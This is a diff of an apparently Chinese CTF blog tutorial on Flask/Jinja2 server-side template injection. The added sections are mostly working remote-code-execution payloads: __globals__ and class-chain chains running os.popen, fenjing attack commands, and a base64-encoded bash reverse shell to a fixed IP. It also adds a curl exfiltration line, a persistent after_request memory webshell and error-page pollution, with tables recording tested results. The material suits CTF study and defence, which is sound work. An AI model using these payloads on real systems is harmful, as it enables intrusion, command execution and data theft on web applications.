@@ -275,9 +275,11 @@
 <p><img src="https://cdn.jsdelivr.net/gh/mayylu/pic@main/blogs/ssti-06.png" alt="ssti-06"></p>
 <h2 id="flask-模板-jinja2-框架-利用"><a href="#flask-模板-jinja2-框架-利用" class="headerlink" title="flask 模板 jinja2 框架 利用"></a>flask 模板 jinja2 框架 利用</h2><p>render_template 渲染的是模板文件；render_template_string 则是把字符串直接当模板渲染</p>
 <p>所以当代码把 render_template 换成 render_template_string、又不处理用户输入时，模板语法就会被执行，这就是 ssti 注入</p>
-<h3 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> x= <span class="string">&#x27;abcd&#x27;</span> %&#125;                           <span class="comment"># 声明变量</span></span><br><span class="line">&#123;% <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>] %&#125;&#123;&#123;i&#125;&#125;&#123;%endfor%&#125;   <span class="comment"># 循环语句</span></span><br><span class="line">&#123;% <span class="keyword">if</span> <span class="number">25</span>==<span class="number">5</span>*<span class="number">5</span> %&#125;&#123;&#123;<span class="number">1</span>&#125;&#125;&#123;% endif %&#125;              <span class="comment"># 条件语句</span></span><br></pre></td></tr></table></figure>
+<h3 id="类链利用原理"><a href="#类链利用原理" class="headerlink" title="类链利用原理"></a>类链利用原理</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="built_in">set</span> x= <span class="string">&#x27;abcd&#x27;</span> %&#125;                           <span class="comment"># 声明变量</span></span><br><span class="line">&#123;% <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>] %&#125;&#123;&#123;i&#125;&#125;&#123;%endfor%&#125;   <span class="comment"># 循环语句</span></span><br><span class="line">&#123;% <span class="keyword">if</span> <span class="number">25</span>==<span class="number">5</span>*<span class="number">5</span> %&#125;&#123;&#123;<span class="number">1</span>&#125;&#125;&#123;% endif %&#125;              <span class="comment"># 条件语句</span></span><br></pre></td></tr></table></figure>
 
-<p><code>__class__</code> 返回类型所属的对象<br><code>__mro__</code> 返回方法解析顺序（MRO）元组，<code>__mro__[1]</code> 一般是 <code>object</code>（Python2 里 <code>str</code> 的 MRO 是 <code>(str, basestring, object)</code>，所以用 <code>[2]</code>）<br><code>__base__</code> 返回该对象直接继承的基类，等价于 <code>__bases__[0]</code><br><code>__subclasses__</code>返回基类中的所有子类，每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br><code>__globals__</code> 是函数所在模块的全局变量字典，能从里面翻到 <code>os</code>、<code>__builtins__</code><br><code>get_flashed_messages()</code> 返回在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用<code>get_flashed_messages()</code> 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)</p>
+<p><code>__class__</code> 返回类型所属的对象<br><code>__mro__</code> 返回方法解析顺序（MRO）元组，<code>__mro__[1]</code> 一般是 <code>object</code>（Python2 里 <code>str</code> 的 MRO 是 <code>(str, basestring, object)</code>，所以用 <code>[2]</code>）<br><code>__base__</code> 返回该对象直接继承的基类，等价于 <code>__bases__[0]</code><br><code>__subclasses__</code>返回基类中的所有子类，每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br><code>__globals__</code> 是函数所在模块的全局变量字典，能从里面翻到 <code>os</code>、<code>__builtins__</code><br><code>get_flashed_messages()</code> 返回在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用<code>get_flashed_messages()</code> 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)<br><code>__builtins__</code> 兜底为什么万能：每个模块的 globals 里 Python 会自动塞一个 <code>__builtins__</code>，里面有 <code>eval</code>、<code>__import__</code>、<code>open</code>、<code>chr</code>，模块没 import os 也能现拿：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;self.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;self.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
 <p>类链怎么走：<code>__class__</code> → <code>__mro__</code>/<code>__base__</code> → <code>__subclasses__()</code> → <code>__init__.__globals__</code> → <code>os</code> / <code>__builtins__</code></p>
 <h4 id="找到基类中的所有子类"><a href="#找到基类中的所有子类" class="headerlink" title="找到基类中的所有子类"></a>找到基类中的所有子类</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()          # &lt;type &#x27;list&#x27;&gt; &lt;type &#x27;object&#x27;&gt;</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2].__subclasses__()        # &lt;type &#x27;str&#x27;&gt; &lt;type &#x27;object&#x27;&gt;</span><br><span class="line">().__class__.__bases__[0].__subclasses__()      # &lt;type &#x27;tuple&#x27;&gt; &lt;type &#x27;object&#x27;&gt;</span><br><span class="line">&#123;&#125;.__class__.__mro__[1].__subclasses__()        # &lt;class &#x27;dict&#x27;&gt; &lt;class &#x27;object&#x27;&gt;</span><br></pre></td></tr></table></figure>
 <p>找到子类，我们就可以去找子类的一些危险方法</p>
@@ -297,6 +299,98 @@
 
 <p>查到的下标 <code>[i]</code> 直接替换掉下面 payload 里的 <code>[71]</code> / <code>[132]</code> / <code>[258]</code>：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[i].__init__.__globals__[&#x27;popen&#x27;](&#x27;id&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;()[request.args.a][request.args.b]&#125;&#125;&amp;a=__class__&amp;b=__base__</span><br></pre></td></tr></table></figure>
+<h3 id="直接从函数出发"><a href="#直接从函数出发" class="headerlink" title="直接从函数出发"></a>直接从函数出发</h3><p>类链不是必须的：<code>__globals__</code> 是<strong>函数对象</strong>的属性，模板里已经给了函数（<code>lipsum</code>、<code>url_for</code>…）时，一步就能到模块全局变量，不用 <code>__class__</code> → <code>__subclasses__()</code> 绕一圈。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;id&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>实测（flask 3.1.3 / jinja2 3.1.6）：</p>
+<table>
+<thead>
+<tr>
+<th>模板里的名字</th>
+<th>是什么</th>
+<th>要类链吗</th>
+<th><code>__globals__</code> 指向</th>
+<th>里面有什么</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>lipsum</code></td>
+<td>function</td>
+<td>不用</td>
+<td><code>jinja2.utils</code></td>
+<td><code>os</code>、<code>__builtins__</code></td>
+</tr>
+<tr>
+<td><code>cycler.__init__</code> / <code>joiner.__init__</code> / <code>namespace.__init__</code></td>
+<td>method</td>
+<td>不用</td>
+<td><code>jinja2.utils</code></td>
+<td><code>os</code>、<code>__builtins__</code></td>
+</tr>
+<tr>
+<td><code>url_for</code></td>
+<td>function</td>
+<td>不用</td>
+<td><code>flask.app</code></td>
+<td><code>os</code>、<code>current_app</code>、<code>__builtins__</code></td>
+</tr>
+<tr>
+<td><code>get_flashed_messages</code></td>
+<td>function</td>
+<td>不用</td>
+<td><code>flask.helpers</code></td>
+<td><code>os</code>、<code>__builtins__</code></td>
+</tr>
+<tr>
+<td><code>self</code></td>
+<td>TemplateReference 对象</td>
+<td>只用一层 <code>.__init__</code></td>
+<td><code>jinja2.runtime</code></td>
+<td><strong>没有 os</strong>，有 <code>__builtins__</code></td>
+</tr>
+<tr>
+<td><code>config</code></td>
+<td>Config 实例</td>
+<td>只用一层 <code>.__class__.__init__</code></td>
+<td><code>flask.config</code></td>
+<td>配置项</td>
+</tr>
+<tr>
+<td><code>&#39;&#39;</code>、<code>[]</code>、<code>()</code>、<code>&#123;&#125;</code></td>
+<td>字符串/列表等</td>
+<td><strong>必须</strong></td>
+<td>无（本身不是函数）</td>
+<td>只能 <code>__subclasses__()</code></td>
+</tr>
+<tr>
+<td><code>request</code></td>
+<td>对象</td>
+<td>一层 <code>.__application.__globals__</code></td>
+<td><code>flask.app</code></td>
+<td><code>__builtins__</code></td>
+</tr>
+</tbody></table>
+<p>环境差异（实测 <code>is defined</code>）：</p>
+<table>
+<thead>
+<tr>
+<th>名字</th>
+<th>纯 Jinja2</th>
+<th>Flask</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>lipsum</code> / <code>cycler</code> / <code>joiner</code> / <code>namespace</code> / <code>self</code></td>
+<td>有</td>
+<td>有</td>
+</tr>
+<tr>
+<td><code>url_for</code> / <code>config</code> / <code>get_flashed_messages</code> / <code>request</code></td>
+<td><strong>没有</strong></td>
+<td>有</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">手上有函数对象  -&gt;  .__globals__                      （lipsum / url_for / get_flashed_messages）</span><br><span class="line">手上有对象实例  -&gt;  .__class__.__init__.__globals__   （config）</span><br><span class="line">手上只有普通值  -&gt;  .__class__.__mro__[1].__subclasses__()[i].__init__.__globals__</span><br><span class="line">模块里没有 os   -&gt;  [&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;)</span><br></pre></td></tr></table></figure>
 
 <h3 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/shrine/&#123;&#123;url_for.__globals__&#125;&#125;                             可以查看所有全局变量</span><br><span class="line">/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;       看到 current_app 就是当前 app，直接取它的 config</span><br><span class="line"></span><br><span class="line">&#123;&#123;config&#125;&#125;   查看所有app.config内容</span><br></pre></td></tr></table></figure>
 
@@ -388,13 +482,56 @@
 <p><strong>命令行方式</strong>（直接打目标）：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python -m fenjing crack -u &#x27;http://target/?name=*&#x27; -i name -e &#x27;id&#x27;</span><br><span class="line">python -m fenjing crack -u &#x27;http://target/&#x27; -i name -m POST -e &#x27;cat /flag&#x27; --cookies &#x27;PHPSESSID=xxx&#x27;</span><br><span class="line">python -m fenjing crack -u &#x27;http://target/&#x27; -i name --environment flask -e &#x27;ls /&#x27;</span><br><span class="line">python -m fenjing crack-json -u &#x27;http://target/api&#x27; -i name -e &#x27;id&#x27;</span><br><span class="line">python -m fenjing crack-request -f request.txt          # 请求存文件，用 PAYLOAD 标记注入点</span><br><span class="line">python -m fenjing crack-keywords -k &#x27;__,config,self&#x27;    # 只知道关键字时让它造 payload</span><br><span class="line">python -m fenjing scan -u &#x27;http://target/&#x27;               # 先扫再打</span><br><span class="line">python -m fenjing webui                                  # 起个网页界面</span><br></pre></td></tr></table></figure>
 
-<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><ul>
-<li>布尔盲注：用条件语句判断，构造 <code>&#123;% if 7*7==49 %&#125;1&#123;% endif %&#125;</code>，看页面是否出现字符</li>
-<li>时间盲注：让命令 <code>sleep 3</code>，看响应是否变慢</li>
-<li>带外：命令结果通过 DNS/HTTP 打出</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;sleep 3&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;curl http://你的vps/?x=`id`&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>模板渲染了，但结果不返回给前端（比如后端只 <code>return &quot;OK&quot;</code>），或者只返回成功/失败 —— 这时候要把”输出”从别的通道送出来。常见有下面几种，越靠前越省事。</p>
+<h4 id="写文件到-static"><a href="#写文件到-static" class="headerlink" title="写文件到 static"></a>写文件到 static</h4><p>最通用的办法：把命令结果写到能被访问的静态目录（Flask 的 <code>static/</code>，或者站点的 <code>public/</code>），再直接访问文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;(id; pwd; ls -la; env) &gt; static/r1.txt 2&gt;&amp;1&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
 
+<p>然后访问 <code>/static/r1.txt</code>。实测文件能正常写出 ✓</p>
+<h4 id="出网反弹-shell"><a href="#出网反弹-shell" class="headerlink" title="出网反弹 shell"></a>出网反弹 shell</h4><p>目标能出网、有 bash 时最省事。命令里不能有空格时用 <code>$&#123;IFS&#125;</code> 顶空格，再把命令 base64 化绕开特殊字符：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;bash$&#123;IFS&#125;-c$&#123;IFS&#125;&#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTcuMjMuNDAvMTExMSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjMuNTcuMjMuNDAvMTExMSAwPiYx</code> 解出来就是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/123.57.23.40/1111 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>也可以直接把结果带出去：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;curl http://你的vps/?x=`id`&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="HTTP-头回显"><a href="#HTTP-头回显" class="headerlink" title="HTTP 头回显"></a>HTTP 头回显</h4><p>Flask 回显马</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: (resp.headers.__setitem__(&#x27;X-Flag&#x27;, __import__(&#x27;os&#x27;).popen(&#x27;printenv FLAG&#x27;).read().strip()), resp)[1])&quot;,&#123;&#x27;app&#x27;:url_for.__globals__[&#x27;sys&#x27;].modules[url_for.__globals__[&#x27;current_app&#x27;].import_name].__dict__[&#x27;app&#x27;]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后任意请求都能在响应头里看到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Flag: moectf&#123;8f61c757-b295-df35-20a1-69760cf89039&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="错误页面回显"><a href="#错误页面回显" class="headerlink" title="错误页面回显"></a>错误页面回显</h4><p>污染 <code>werkzeug.exceptions</code> 里异常类的 <code>description</code>，随便访问一个不存在的路径就能看到结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__.__builtins__[&#x27;setattr&#x27;](url_for.__globals__[&#x27;sys&#x27;].modules[&#x27;werkzeug.exceptions&#x27;].NotFound,&#x27;description&#x27;,url_for.__globals__.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read())&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>实测：<code>GET /no-such-page</code> 的 404 页面里出现 <code>NOTFOUND_PWNED</code> ✓</p>
+<p>把 <code>NotFound</code> 换成 <code>InternalServerError</code>、<code>BadRequest</code> 等，可以污染别的错误页。</p>
+<h4 id="注入内存马"><a href="#注入内存马" class="headerlink" title="注入内存马"></a>注入内存马</h4><p>挂一个 <code>after_request</code> 钩子，之后所有请求都能用 <code>?cmd=</code> 执行命令，不用再发 payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(&#x27;flask&#x27;).make_response(__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;)).read())\&quot;)==None else resp)&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:(url_for.__globals__[&#x27;sys&#x27;].modules.get(&#x27;__main__&#x27;).__dict__.get(&#x27;app&#x27;) or url_for.__globals__[&#x27;sys&#x27;].modules[url_for.__globals__[&#x27;current_app&#x27;].import_name].__dict__[&#x27;app&#x27;])&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>之后 <code>GET /?cmd=id</code> 直接回显。实测 <code>?cmd=echo MEM_OK</code> → <code>MEM_OK</code>、<code>?cmd=whoami</code> → 用户名、<code>?cmd=printenv FLAG</code> → flag ✓</p>
+<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>实在送不出去（不出网、没静态目录、header 也被挡），只能一位一位地猜：</p>
+<ul>
+<li><strong>布尔盲注</strong>：用条件语句，让”条件真/假”对应页面内容或状态码不同</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if 7*7==49 %&#125;yes&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>时间盲注</strong>：条件为真时才执行 <code>sleep</code>，看响应时间</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if 7*7==49 %&#125;&#123;&#123;lipsum.__globals__[&#x27;os&#x27;].popen(&#x27;sleep 3&#x27;).read()&#125;&#125;&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>带外</strong>：结果通过 DNS/HTTP 打出去（适合有出网但没回显）</li>
+</ul>
+<p>实测（把 <code>sleep</code> 换成 Python 版给 Windows 测的）：条件真 1.58s、条件假 0.01s ✓；注意 <code>sleep</code> 是 Linux 命令，Windows 靶场要换 <code>ping -n 3 127.0.0.1</code> 之类</p>
+<blockquote>
+<p>参考：cnblogs「jinjia2 无回显 SSTI」（shinnylbz），本文把里面失效的 <code>lipsum.__spec__</code> 写法换成了实测可用的 <code>url_for.__globals__[&#39;sys&#39;]</code></p>
+</blockquote>
 <h3 id="案例：-WesternCTF2018-shrine1"><a href="#案例：-WesternCTF2018-shrine1" class="headerlink" title="案例：[WesternCTF2018]shrine1"></a>案例：[WesternCTF2018]shrine1</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">import flask</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">// app.config 保存这个 app 的所有配置变量</span><br><span class="line">app.config[&#x27;FLAG&#x27;] = os.environ.pop(&#x27;FLAG&#x27;)</span><br><span class="line">// 注册了一个名为 FLAG 的 config，猜测这就是 flag，如果没有过滤可以直接&#123;&#123;config&#125;&#125;查看所有 app.config 内容</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return open(__file__).read()</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/shrine/&#x27;)</span><br><span class="line">def shrine(shrine):</span><br><span class="line"></span><br><span class="line">    def safe_jinja(s):</span><br><span class="line">        s = s.replace(&#x27;(&#x27;, &#x27;&#x27;).replace(&#x27;)&#x27;, &#x27;&#x27;)// 转义括号</span><br><span class="line">        blacklist = [&#x27;config&#x27;, &#x27;self&#x27;]</span><br><span class="line">        return &#x27;&#x27;.join([&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;.format(c) for c in blacklist]) + s</span><br><span class="line">// 上面这行代码把黑名单的东西遍历并设为空</span><br><span class="line">    return flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(debug=True)</span><br></pre></td></tr></table></figure>
 
 <p>原理：<code>render_template</code> 渲染的是模板文件，<code>&#123;&#123; &#125;&#125;</code> 会被正常求值；换成 <code>render_template_string</code> 并把用户输入直接当模板渲染，就会发生 ssti 注入</p>
